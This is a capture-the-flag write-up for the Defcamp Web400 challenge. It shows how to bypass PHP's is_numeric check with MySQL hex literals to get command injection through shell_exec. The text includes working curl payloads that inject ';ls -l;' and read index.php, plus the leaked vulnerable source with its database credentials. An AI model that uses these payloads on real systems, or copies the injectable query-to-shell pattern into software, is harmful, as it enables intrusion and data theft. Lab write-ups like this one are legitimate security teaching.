# Defcamp CTF - Web400


The website of the challenge is only displaying user number and their associated picture... Looking at the code we can see 

- For user 1 the picture src field is : `?id=1&usr=1`
- For user 2 the picture src field is : `?id=2&usr=2`
- ...

Strange... Do not think too fast to a SQLi (because it's not gonna be one) and let's try playing a little with `curl` and GET parameters : 

```bash
$> curl "http://10.13.37.5/?id=2&usr=1"
cat: images/2_6.jpg: No such file or directory
```
Ohhh... There is a direct call to `cat` from PHP. Let's try to make index.php source code appear :

```bash
$> curl "http://10.13.37.5/?id=../index.php;&usr=1"
ID or User ID must be numeric, obviously. Cheers from Bucharest, awesome girls, smoke free. :-) 
[...]
```

Ok, the "is_numeric()" PHP function is certainely used. Let's try playing with float numbers :

```bash
$> curl "http://10.13.37.5/?id=2.1123213&usr=1"
cat: images/2.1123213_6.jpg: No such file or directory
```
Nice but not very useful. As I know of, there is no direct bypassing technique for the "is_numeric()" function, except when used in combination with MySQL (quite common) which support Hex Literals... So let's try with an hexadecimal number :

```bash
$> curl "http://10.13.37.5/?id=0x1&usr=1"
cat: images/_6.jpg: No such file or directory
```
The hexadecimal number given in parameter seem to be interpreted and don't appear anymore.

Now we can try with "../index.php" in hexadecimal : 

```bash
$> curl "http://10.13.37.5/?id=0x2e2e2f696e6465782e7068703b&usr=1"
cat: images/../index.php_6.jpg: No such file or directory
```

Yeah ! but we have to remove "_6.jpg", since we are in a shell we can just add  ";" (0x3b) :

```bash
$> curl "http://10.13.37.5/?id=0x2e2e2f696e6465782e7068703b&usr=1"
```

Nice ! We have the index.php source code :

```php
<?php

// ini_set('display_errors',1);
// error_reporting(E_ALL);

mysql_connect('localhost','w400', 'lajsflkjaslfjasklfj10412497128') or die('neah');
mysql_select_db('w400');

if(isset($_GET['id'], $_GET['usr'])) {

    if(!is_numeric($_GET['id']) || !is_numeric($_GET['usr'])) {
        die('ID or User ID must be numeric, obviously. Cheers from Bucharest, awesome girls, smoke free. :-) <br><img src="data:image/jpeg;base64,........... }

    $q = mysql_query('SELECT concat('.$_GET['id'].',"_",image) as path FROM images WHERE id="'.$_GET['usr'].'"');
    $path = mysql_result($q, 0);

    header('Content-Type: image/jpeg');
    echo shell_exec("cat images/$path 2>&1");
} else {
    echo '<h1>List of some users! I don\'t know CSS! :(</h1>';
    $q = mysql_query('SELECT * FROM `images`');
    while($row = mysql_fetch_array($q)) {
        echo '<h3>'.$row['user'].'</h3>';
        echo '<img src="?id='.$row['id'].'&usr='.$row['id'].'">';
    }
}
sh: 1: _6.jpg: not found

```

Nothing interesting in the source code so let's try a ";ls -l;" : 

```bash
$> curl "http://10.13.37.5/?id=0x3b6c73202d6c3b&usr=1"
total 32
-rw-r--r-- 1 root root    38 Oct  1 22:14 6e8218531e0580b6754b3e3be5252873.txt
drwxrwxr-x 2 root root  4096 Oct  1 22:14 images
-rw-r--r-- 1 root root 21392 Oct  1 22:17 index.php
sh: 1: _6.jpg: not found
```

Done ! We only have to get 6e8218531e0580b6754b3e3be5252873.txt (by using `HTTP://x.x.x.x/6e8218531e0580b6754b3e3be5252873.txt` or with `cat` in the command injection...)

**DCTF{19b1f9f19688da85ec52a735c8da0dd3}**